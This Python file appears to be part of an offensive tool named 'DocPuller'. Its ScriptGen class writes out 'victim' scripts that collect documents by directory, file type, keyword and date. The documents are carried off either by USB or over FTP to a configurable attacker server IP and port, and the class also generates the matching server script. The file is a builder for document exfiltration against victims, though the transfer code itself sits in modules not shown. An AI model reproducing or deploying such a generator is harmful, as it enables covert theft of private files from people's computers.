from constants.constatns import DOCPULLER_USB_PY_SCRIPT, DOCPULLER_FTP_SERVER_PY_SCRIPT, DOCPULLER_FTP_VICTIM_PY_SCRIPT


class ScriptGen:

    def __init__(self, is_usb, direcoties, file_type, date, keywords, server_ip, server_port):
        self.is_usb = is_usb
        if is_usb:
            self.parms = f'{direcoties}, {file_type}, {keywords}, {date}'

            self.SCRIPT = f"""
        
from docpuller_scripts.docpuller_usb.victim_usb import DocPullerUSB

def main():

    docPuller = DocPullerUSB({self.parms})

    docPuller.main()
    
    
if __name__ == '__main__':
    main();

        """

        else:
            self.server_parms =rf'"{server_ip}", {server_port}, "c:\\"'
            self.victim_parms = f'"{server_ip}", {server_port}, {direcoties}, {file_type}, {keywords}, {date}'
            self.SCRIPT1 = f"""

from docpuller_scripts.docpuller_ftp.server_ftp import Server


def main():

    docPuller = Server({self.server_parms})

    docPuller.main()


if __name__ == '__main__':
    main()

                    """

            self.SCRIPT2 = f"""

from docpuller_scripts.docpuller_ftp.victim_ftp import Victim

def main():

    docPuller = Victim({self.victim_parms})

    docPuller.main()


if __name__ == '__main__':
    main()

                    """

    def write_to_file(self):
        if self.is_usb:
            with open(DOCPULLER_USB_PY_SCRIPT, 'w') as f:
                f.write(self.SCRIPT)
        else:
            with open(DOCPULLER_FTP_SERVER_PY_SCRIPT, 'w') as f:
                f.write(self.SCRIPT1)
            with open(DOCPULLER_FTP_VICTIM_PY_SCRIPT, 'w') as f:
                f.write(self.SCRIPT2)
